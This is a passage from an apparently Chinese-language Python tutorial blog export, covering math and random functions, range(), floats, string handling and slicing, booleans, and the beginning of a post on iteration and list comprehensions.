<td align="left">返回浮点数x的四舍五入值，如给出n值，则代表舍入到小数点后的位数。</td>
</tr>
<tr>
<td align="left">sqrt(x)</td>
<td align="left">返回数字x的平方根</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>五、随机数函数</strong></font> </p>
<p><font face="Comic sans MS">随机数可以用于数学，游戏，安全等领域中，还经常被嵌入到算法中，用以提高算法效率，并提高程序的安全性。</font></p>
<p>Python包含以下常用随机数函数：</p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">choice(seq)</td>
<td align="left">从序列的元素中随机挑选一个元素，比如random.choice(range(10))，<br>从0到9中随机挑选一个整数。</td>
</tr>
<tr>
<td align="left">randrange</td>
<td align="left">([start,] stop [,step])    从指定范围内，按指定基数递增的集合中获取一个随机数，<br>基数缺省值为1</td>
</tr>
<tr>
<td align="left">random()</td>
<td align="left">随机生成下一个实数，它在[0,1)范围内。</td>
</tr>
<tr>
<td align="left">seed([x])</td>
<td align="left">改变随机数生成器的种子seed。如果你不了解其原理，你不必特别去设定seed，<br>Python会帮你选择seed。</td>
</tr>
<tr>
<td align="left">shuffle(lst)</td>
<td align="left">将序列的所有元素随机排序</td>
</tr>
<tr>
<td align="left">uniform(x, y)</td>
<td align="left">随机生成下一个实数，它在[x,y]范围内。</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>六、三角函数</strong></font> </p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">acos(x)</td>
<td align="left">返回x的反余弦弧度值。</td>
</tr>
<tr>
<td align="left">asin(x)</td>
<td align="left">返回x的反正弦弧度值。</td>
</tr>
<tr>
<td align="left">atan(x)</td>
<td align="left">返回x的反正切弧度值。</td>
</tr>
<tr>
<td align="left">atan2(y, x)</td>
<td align="left">返回给定的 X 及 Y 坐标值的反正切值。</td>
</tr>
<tr>
<td align="left">cos(x)</td>
<td align="left">返回x的弧度的余弦值。</td>
</tr>
<tr>
<td align="left">hypot(x, y)</td>
<td align="left">返回欧几里德范数 sqrt(x<em>x + y</em>y)。</td>
</tr>
<tr>
<td align="left">sin(x)</td>
<td align="left">返回的x弧度的正弦值。</td>
</tr>
<tr>
<td align="left">tan(x)</td>
<td align="left">返回x弧度的正切值。</td>
</tr>
<tr>
<td align="left">degrees(x)</td>
<td align="left">将弧度转换为角度,如degrees(math.pi/2) ， 返回90.0</td>
</tr>
<tr>
<td align="left">radians(x)</td>
<td align="left">将角度转换为弧度</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>七、数学常量</strong></font></p>
<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pi</td>
<td align="left">数学常量 pi（圆周率，一般以π来表示）</td>
</tr>
<tr>
<td align="left">e</td>
<td align="left">数学常量 e，e即自然常数（自然常数）。</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>八、 range()函数</strong><br></font></p>
<p><font face="Comic sans MS">Python3 range() 函数返回的是一个可迭代对象（类型是对象），而不是列表类型， 所以打印的时候不会打印列表。<br></font></p>
<p><font face="Comic sans MS">Python3 list() 函数是对象迭代器，可以把range()返回的可迭代对象转为一个列表，返回的变量类型为列表。<br></font></p>
<p><font face="Comic sans MS">Python2 range() 函数返回的是列表。<br></font></p>
<p><font face="Comic sans MS"><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-built-in-functions.html">Python3 内置函数</a>]</font></font>&emsp;<font face="Comic sans MS"><font color="#00B2EE">[<a href="http://www.runoob.com/python3/python3-func-range.html">Python3 range() 函数用法</a>]</font><br></font></p>
<br>

<p><strong>函数语法：</strong><br><font color="#FF7F00"><strong>range(stop)</strong></font><br><font color="#FF7F00"><strong>range(start, stop[, step])</strong></font></p>
<br>

<blockquote>
<p><strong>参数说明：</strong><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>start:</strong></font> 计数从 start开始。默认是从 0 开始。例如range（5）等价于range（0， 5）;</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>stop:</strong></font> 计数到 stop 结束，但不包括 stop。例如：range（0， 5） 是[0, 1, 2, 3, 4]没有5</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>step：</strong></font>步长，默认为1。例如：range（0， 5） 等价于 range(0, 5, 1)</font></p>
</blockquote>
<br>

<br>

<h4 id="3-2-浮点数"><a href="#3-2-浮点数" class="headerlink" title="3.2 浮点数"></a><font color="#3CB371" face="Comic sans MS">3.2 浮点数</font></h4><ol>
<li><p><font face="Comic sans MS">浮点数也就是小数，之所以称为浮点数，<strong>是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的</strong>，比如，1.23x10^9和12.3x10^8是完全相等的。浮点数可以用数学写法，如**<code>1.23</code><strong>，</strong><code>3.14</code><strong>，</strong><code>-9.01</code><strong>，等等。但是对于很大或很小的浮点数，就必须用科学计数法表示，</strong>把10用e替代<strong>，1.23x109就是</strong><code>1.23e9</code><strong>，或者</strong><code>12.3e8</code><strong>，0.000012可以写成</strong><code>1.2e-5</code>**，等等。</font></p>
</li>
<li><p><font face="Comic sans MS">整数和浮点数在计算机内部存储的方式是不同的，整数运算永远是精确的（除法难道也是精确的？是的！），而浮点数运算则可能会有四舍五入的误差。</font></p>
</li>
</ol>
<br>

<h4 id="3-3-字符串"><a href="#3-3-字符串" class="headerlink" title="3.3 字符串"></a><font color="#3CB371" face="Comic sans MS">3.3 字符串</font></h4><h5 id="1-定义字符串并输出"><a href="#1-定义字符串并输出" class="headerlink" title="1.定义字符串并输出"></a><font color="#00B2EE" face="Comic sans MS">1.定义字符串并输出</font></h5><ol>
<li><font face="Comic sans MS"><font color="red" face="Comic sans MS"><strong>区分单引号和双引号：</strong></font>字符串是以单引号**<code>&#39;</code><strong>或双引号</strong><code>&quot;</code><strong>括起来的任意文本，比如</strong><code>&#39;abc&#39;</code><strong>，</strong><code>&quot;xyz&quot;</code><strong>等等。</font><br><font face="Comic sans MS">**请注意</strong>：**<code>&#39;&#39;</code><strong>或</strong><code>&quot;&quot;</code><strong>本身只是一种表示方式，不是字符串的一部分，因此，字符串</strong><code>&#39;abc&#39;</code><strong>只有</strong><code>a</code><strong>，</strong><code>b</code><strong>，</strong><code>c</code><strong>这3个字符。如果<code>&#39;</code>本身也是一个字符，那就可以用<code>&quot;&quot;</code>括起来，比如<code>&quot;I&#39;m OK&quot;</code>包含的字符是</strong><code>I</code><strong>，</strong><code>&#39;</code><strong>，</strong><code>m</code><strong>，</strong><code>空格</code><strong>，</strong><code>O</code><strong>，</strong><code>K</code><strong>这6个字符。<br>即<font color="#FF7F00">**单引号要放到双引号里面，双引号要放到单引号里面</strong></font>。</font></li>
</ol>
<br>

<ol start="2">
<li><font color="red" face="Comic sans MS"><strong>使用转义字符“<code>\</code>”</strong></font> ： <font face="Microsoft YaHei">如果字符串内部既包含**<code>&#39;</code><strong>又包含</strong><code>&quot;</code><strong>怎么办？可以用转义字符</strong><code>\</code>**来标识，比如：</font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;I\&#x27;m \&quot;OK\&quot;!&#x27;</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">I<span class="string">&#x27;m &quot;OK&quot;! </span></span><br></pre></td></tr></table></figure>

<br>

<p><font face="Microsoft YaHei">把双引号括在单引号里面，但是下面的单引号必须转义，如下也是正确的：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;I\&#x27;m &quot;OK&quot;!&#x27;</span></span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li><font color="red" face="Comic sans MS"><strong>使用不转义字符“<code>r&#39;&#39;</code>”</strong></font>： <font face="Microsoft YaHei">如果字符串里面有很多字符都需要转义，就需要加很多**<code>\</code><strong>，为了简化，Python还允许用<code>r&#39;&#39;</code>表示，<font color="#FF7F00"></strong><code>&#39;&#39;</code>内部的字符串默认不转义**</font>，可以自己试试：</font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;\\\t\\&#x27;</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">a=<span class="string">r&#x27;\\\t\\&#x27;</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">\	\ </span><br><span class="line">\\\t\\ </span><br></pre></td></tr></table></figure>


<br>

<ol start="4">
<li><font color="red" face="Comic sans MS"><strong>在字符串里面有换行，将字符串按照换行输出。使用</strong><code>&#39;&#39;&#39;  内容  &#39;&#39;&#39;</code><strong>：</strong></font><font face="Microsoft YaHei">如果字符串内部有很多换行，用**<code>\n</code><strong>写在一行里不好阅读，为了简化，Python允许用</strong><code>&#39;&#39;&#39; 这里写内容&#39;&#39;&#39;</code>**的格式表示多行内容，可以自己试试：</font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;&#x27;&#x27;hello</span></span><br><span class="line"><span class="string">world</span></span><br><span class="line"><span class="string">line1</span></span><br><span class="line"><span class="string">line2&#x27;&#x27;&#x27;</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">hello </span><br><span class="line">world </span><br><span class="line">line1 </span><br><span class="line">line2 </span><br></pre></td></tr></table></figure>

<br>

<ol start="5">
<li><font color="red" face="Comic sans MS"><strong>在字符串里面有换行，将字符串按照换行输出，并且不转义输出字符。使用<code>r&#39;&#39;&#39;  &#39;&#39;&#39;</code>：</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">r&#x27;&#x27;&#x27;hello \n</span></span><br><span class="line"><span class="string">world</span></span><br><span class="line"><span class="string">line1</span></span><br><span class="line"><span class="string">line2&#x27;&#x27;&#x27;</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">hello \n </span><br><span class="line">world </span><br><span class="line">line1 </span><br><span class="line">line2 </span><br></pre></td></tr></table></figure>


<br>

<h5 id="2-使用字符串-取下标"><a href="#2-使用字符串-取下标" class="headerlink" title="2.使用字符串(取下标)"></a><font color="#00B2EE" face="Comic sans MS">2.使用字符串(取下标)</font></h5><blockquote>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>python的字串列表有2种取值顺序:</strong></font></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">从左到右索引默认<font color="#FF7F00"><strong>0</strong></font>开始的，最大范围是字符串<strong>长度少1</strong>；</font></li>
<li><font face="Microsoft YaHei">从右到左索引默认-1开始的，最大范围是字符串开头。</font></li>
</ol>
<p><img data-src="https://i.loli.net/2019/02/27/5c7665042686e.png" alt="python-string-slice.png"></p>
<blockquote>
<ol start="3">
<li><font face="Microsoft YaHei">如果你要实现从字符串中获取一段<strong>子字符串</strong>的话，可以使用 <font color="#FF7F00"><strong>[头下标:尾下标]</strong></font> 来截取相应的字符串，其中下标是从 0 开始算起，可以是正数或负数，下标可以为空表示取到头或尾。</font></li>
<li><font face="Microsoft YaHei"><strong><code>[头下标:尾下标]</code></strong> 获取的子字符串包含头下标的字符，但<strong>不包含尾下标的字符</strong>。</font></li>
</ol>
</blockquote>
<br>

<p>比如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line">print(s[<span class="number">2</span>])</span><br><span class="line">print(s[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">c </span><br><span class="line">bcde </span><br></pre></td></tr></table></figure>

<blockquote>
<p><font face="Microsoft YaHei">当使用以冒号**<code>:</code>**分隔的字符串，python 返回一个新的对象，结果包含了以这对偏移标识的连续的内容，左边的开始是包含了下边界。<br>上面的结果包含了 s[1] 的值 b，而取到的最大范围不包括尾下标，就是 s[5] 的值 f。</font></p>
</blockquote>
<p><img data-src="https://i.loli.net/2019/02/27/5c76663ee5909.png" alt="9aU.png"></p>
<br>

<h5 id="3-加号-星号-冒号"><a href="#3-加号-星号-冒号" class="headerlink" title="3.加号(+)星号(*)冒号(:)"></a><font color="#00B2EE" face="Comic sans MS">3.加号(+)星号(*)冒号(:)</font></h5><blockquote>
<ol>
<li><font color="#FF7F00"><strong>加号(+)：</strong></font><strong>拼接字符串；</strong></li>
<li><font color="#FF7F00"><strong>星号(*)：</strong></font><strong>重复操作；</strong></li>
<li><font color="#FF7F00"><strong>冒号(:)：</strong></font><strong>截取字符。</strong></li>
</ol>
</blockquote>
<br>

<ol>
<li><font color="red"><strong>Python使用加号（ + ）来合并字符串</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">first_name = <span class="string">&quot;ada&quot;</span></span><br><span class="line">last_name = <span class="string">&quot;lovelace&quot;</span></span><br><span class="line">full_name = first_name + <span class="string">&quot; &quot;</span> + last_name</span><br><span class="line">print(<span class="string">&quot;Hello, &quot;</span> + full_name + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Hello, ada lovelace! </span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li><font color="red"><strong>Python使用星号（ * ）来重复字符串</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">a=str*<span class="number">2</span></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">Hello World!Hello World! </span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li><font color="red"><strong>Python使用冒号（ ： ）来截取字符</strong></font></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"> </span><br><span class="line">str = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"> </span><br><span class="line">print str           # 输出完整字符串</span><br><span class="line">print str[0]        # 输出字符串中的第一个字符</span><br><span class="line">print str[2:5]      # 输出字符串中第三个至第五个之间的字符串</span><br><span class="line">print str[2:]       # 输出从第三个字符开始的字符串</span><br><span class="line">print str * 2       # 输出字符串两次</span><br><span class="line">print str + &quot;TEST&quot;  # 输出连接的字符串</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">Hello World!</span><br><span class="line">H</span><br><span class="line">llo</span><br><span class="line">llo World!</span><br><span class="line">Hello World!Hello World!</span><br><span class="line">Hello World!TEST</span><br></pre></td></tr></table></figure>


<blockquote>
<p><font face="Microsoft YaHei">Python 列表截取可以接收第三个参数，<font color="#FF7F00"><strong>参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串：</strong></font></font></p>
</blockquote>
<p><img data-src="https://i.loli.net/2019/02/27/5c766ace2223e.png" alt="python_list_slice_2.png"></p>
<br>

<h5 id="4-常用的字符串方法"><a href="#4-常用的字符串方法" class="headerlink" title="4.常用的字符串方法"></a><font color="#00B2EE" face="Comic sans MS">4.常用的字符串方法</font></h5><h6 id="1-修改字符串的大小写"><a href="#1-修改字符串的大小写" class="headerlink" title="1. 修改字符串的大小写"></a><font color="#20B2AA" face="Comic sans MS">1. 修改字符串的大小写</font></h6><blockquote>
<p><font color="#FF7F00"><strong>使用方法：</strong></font></p>
</blockquote>
<ol>
<li><strong>upper()**：将字符串<font color="#FF7F00">**所有字母大写</strong></font>；</li>
<li><strong>lower()**：将字符串<font color="#FF7F00">**所有字母小写</strong></font>；</li>
<li><strong>title()**：将字符串<font color="#FF7F00">**所有单词首字母大写，并将单词中除了首字母的变为小写</strong></font>。</li>
</ol>
<br>

<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Hexo lovelace giTHub toMMrow n&quot;</span></span><br><span class="line">print(name.upper())</span><br><span class="line">print(name.lower())</span><br><span class="line">print(name.title())</span><br><span class="line"></span><br><span class="line">运行输出：</span><br><span class="line">HEXO LOVELACE GITHUB TOMMROW N </span><br><span class="line">hexo lovelace github tommrow n </span><br><span class="line">Hexo Lovelace Github Tommrow N </span><br></pre></td></tr></table></figure>


<p><font face="Microsoft YaHei">在**<code>name.title()</code>** 中，name 后面的句点（ <strong><code>.</code></strong> ）让Python对变量name 执行方法title() 指定的操作。每个方法后面都跟着一对括号，这是因为方法通常需要<font color="#FF7F00"><strong>额外的信息来完成其工作</strong></font>。这种信息是在括号内提供的。函数title() 不需要额外的信息，因此它后面的括号是空的。</font></p>
<br>

<h6 id="2-暂时-永久删除字符串两端空白"><a href="#2-暂时-永久删除字符串两端空白" class="headerlink" title="2. 暂时/永久删除字符串两端空白"></a><font color="#20B2AA" face="Comic sans MS">2. 暂时/永久删除字符串两端空白</font></h6><blockquote>
<p><font color="#FF7F00"><strong>使用方法：</strong></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei"><strong>strip()：</strong>删除字符串<font color="#FF7F00"><strong>两端</strong></font>空白或换行符；</font></li>
<li><font face="Microsoft YaHei"><strong>lstrip()：</strong>删除字符串<font color="#FF7F00"><strong>左</strong></font>端空白或换行符；</font></li>
<li><font face="Microsoft YaHei"><strong>rstrip()：</strong>删除字符串<font color="#FF7F00"><strong>右</strong></font>端空白或换行符；</font></li>
</ol>
<br>

<blockquote>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>暂时</strong></font>或者是<font color="#FF7F00"><strong>永久</strong></font>删除的区别是在于调用方法后是否重新赋值给一个变量：</font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei"><strong>不赋值：</strong><font color="#FF7F00">暂时删除，下次调用时还是原字符串</font>；</font></li>
<li><font face="Microsoft YaHei"><strong>重新赋值：</strong><font color="#FF7F00">永久删除</font>。</font></li>
</ol>
<br>

<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;    HexoAndGithub  &quot;</span></span><br><span class="line"></span><br><span class="line">print(name)</span><br><span class="line">print(name.strip())</span><br><span class="line">print(name.rstrip())</span><br><span class="line">print(name.lstrip())</span><br><span class="line">print(name)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">name = name.strip()</span><br><span class="line">print(name)</span><br><span class="line">print(name.strip())</span><br><span class="line">print(name.rstrip())</span><br><span class="line">print(name.lstrip())</span><br><span class="line">print(name)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">    HexoAndGithub   </span><br><span class="line">HexoAndGithub </span><br><span class="line">    HexoAndGithub </span><br><span class="line">HexoAndGithub   </span><br><span class="line">    HexoAndGithub   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br><span class="line">HexoAndGithub </span><br></pre></td></tr></table></figure>


<br>

<h6 id="3-内置函数-len-返回字符串长度"><a href="#3-内置函数-len-返回字符串长度" class="headerlink" title="3. 内置函数 len()返回字符串长度"></a><font color="#20B2AA" face="Comic sans MS">3. 内置函数 len()返回字符串长度</font></h6><p><font face="Microsoft YaHei">内置函数 len() 返回字符串长度，注意，它<strong>并不是字符串的方法！！！</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;supercalifragilisticexpialidocious&#x27;</span></span><br><span class="line">b = len(a)</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">supercalifragilisticexpialidocious </span><br><span class="line"><span class="number">34</span> </span><br></pre></td></tr></table></figure>


<br>

<h4 id="3-4-布尔值"><a href="#3-4-布尔值" class="headerlink" title="3.4 布尔值"></a><font color="#3CB371" face="Comic sans MS">3.4 布尔值</font></h4><ol>
<li><p><font face="Microsoft YaHei">布尔值和布尔代数的表示完全一致，一个布尔值只有**<code>True</code><strong>、</strong><code>False</code>**两种值，要么是True，要么是False；</font></p>
</li>
<li><p><font face="Microsoft YaHei">在Python中，True、False<font color="#FF7F00"><strong>首字母必须大写</strong></font>。可以直接用True、False表示布尔值，请注意大小写，也可以通过布尔运算计算出来：</font></p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="literal">True</span></span><br><span class="line">b=<span class="number">3</span>&gt;<span class="number">2</span></span><br><span class="line">print(a,b)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">True</span> <span class="literal">True</span> </span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li><font face="Microsoft YaHei"><strong>布尔值可以用<code>and</code>、<code>or</code>和<code>not</code>运算</strong></font><ol>
<li><font face="Microsoft YaHei"><strong><code>and</code>**运算是</strong>与运算<strong>，只有<font color="#FF7F00">**所有都为True，and运算结果才是True</strong></font> </font></li>
<li><font face="Microsoft YaHei"><strong><code>or</code>**运算是</strong>或运算<strong>，只要<font color="#FF7F00">**其中有一个为True，or运算结果就是True</strong></font> </font></li>
<li><font face="Microsoft YaHei"><strong><code>not</code>**运算是</strong>非运算<strong>，它是一个单目运算符，<font color="#FF7F00">**把True变成False，False变成True</strong></font> </font>s</li>
</ol>
</li>
</ol>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a= <span class="number">5</span> &gt; <span class="number">3</span> <span class="keyword">and</span> <span class="number">3</span> &lt; <span class="number">1</span></span><br><span class="line">b= <span class="number">5</span> &gt; <span class="number">3</span> <span class="keyword">or</span> <span class="number">1</span> &gt; <span class="number">3</span></span><br><span class="line">c= <span class="keyword">not</span> <span class="number">1</span> &gt; <span class="number">2</span></span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">False</span> </span><br><span class="line"><span class="literal">True</span> </span><br><span class="line"><span class="literal">True</span> </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-生成器与迭代器</title>
    <url>/post/Python-generator-iterator/</url>
    <content><![CDATA[<p>生成器生成想要的数据，可控制循环暂停，迭代器把可迭代的对象转换为生成器。( ⸝⸝⸝•_•⸝⸝⸝ )♡︎♡︎</p>
<a id="more"></a>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>生成器与迭代器</font> </center>

<br>

<br>


<h3 id="一-迭代、列表生成式"><a href="#一-迭代、列表生成式" class="headerlink" title="一. 迭代、列表生成式"></a><font color="#FF6347" face="Comic sans MS">一. 迭代、列表生成式</font></h3><h4 id="1-1-迭代"><a href="#1-1-迭代" class="headerlink" title="1.1 迭代"></a><font color="#3CB371" face="Comic sans MS">1.1 迭代</font></h4><p><font color="#FF7F00"><strong>迭代：</strong></font>如果给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，这种遍历我们称为迭代（Iteration）。<font color="#FF7F00"><strong>Python的for…in循环就是迭代</strong></font>。</p>
<p>list这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，比如dict就可以迭代：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> d:</span><br><span class="line">    print(key)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<ol>
<li>因为dict、set的存储不是按照list的方式顺序排列，所以，迭代出的结果顺序很可能不一样。</li>
<li>默认情况下，dict迭代的是key。如果要迭代value，可以用<code>for value in d.values()</code>，如果要同时迭代key和value，可以用<code>for k, v in d.items()</code>。</li>
<li>当我们使用for循环时，只要作用于一个<font color="#FF7F00"><strong>可迭代对象</strong></font>，for循环就可以正常运行，而我们不太关心该对象究竟是list还是其他数据类型。</li>
</ol>
</blockquote>
<p>最后一个小问题，如果要对list实现类似Java那样的下标循环怎么办？<font color="#FF7F00"><strong>Python内置的enumerate函数可以把一个list变成索引-元素对</strong></font>，这样就可以在for循环中同时迭代索引和元素本身：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i, value <span class="keyword">in</span> enumerate([<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>]):</span><br><span class="line">     print(i, value)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">0</span> A</span><br><span class="line"><span class="number">1</span> B</span><br><span class="line"><span class="number">2</span> C</span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="1-2-列表生成式"><a href="#1-2-列表生成式" class="headerlink" title="1.2 列表生成式"></a><font color="#3CB371" face="Comic sans MS">1.2 列表生成式</font></h4><p><strong>规则：</strong>for前面是一个表达式，表示将in后面的元素按照这个表达式进行计算出来后还要看in后面有没有筛选条件，<br>然后赋值给for…in中间的变量。格式如下：</p>
<p><font color="#FF7F00"><strong>表达式1 for 变量 in 可迭代对象 [表达式2]</strong></font></p>
<br>

<p>列表生成式即List Comprehensions，是Python内置的非常简单却强大的可以用来创建list的生成式。</p>
<p>举个例子，要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用<code>list(range(1, 11))</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    print(a)</span><br><span class="line"></span><br><span class="line">b = list(range(<span class="number">1</span>,<span class="number">11</span>))	</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br></pre></td></tr></table></figure>

<br>

<p>但如果要生成[1x1, 2x2, 3x3, …, 10x10]怎么做？方法一是循环：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    L.append(x * x)</span><br><span class="line">print(L)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure>

<br>

<p>但是循环太繁琐，而<font color="#FF7F00"><strong>列表生成式</strong></font>则可以用一行语句代替循环生成上面的list：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>)]</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>, <span class="number">100</span>]</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>前面是一个表达式，表示将<span class="keyword">in</span>后面的元素按照这个表达式进行计算出来后还要看<span class="keyword">in</span>后面有没有筛选条件，</span><br><span class="line">然后赋值给<span class="keyword">for</span>...<span class="keyword">in</span>中间的变量。格式如下：</span><br><span class="line"></span><br><span class="line">表达式<span class="number">1</span> <span class="keyword">for</span> 变量 <span class="keyword">in</span> 可迭代对象 [表达式<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> <span class="keyword">for</span>循环后面还可以加上<span class="keyword">if</span>判断，这样我们就可以筛选出仅偶数的平方：</span><br><span class="line"></span><br><span class="line">a = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">11</span>) <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="number">4</span>, <span class="number">16</span>, <span class="number">36</span>, <span class="number">64</span>, <span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span 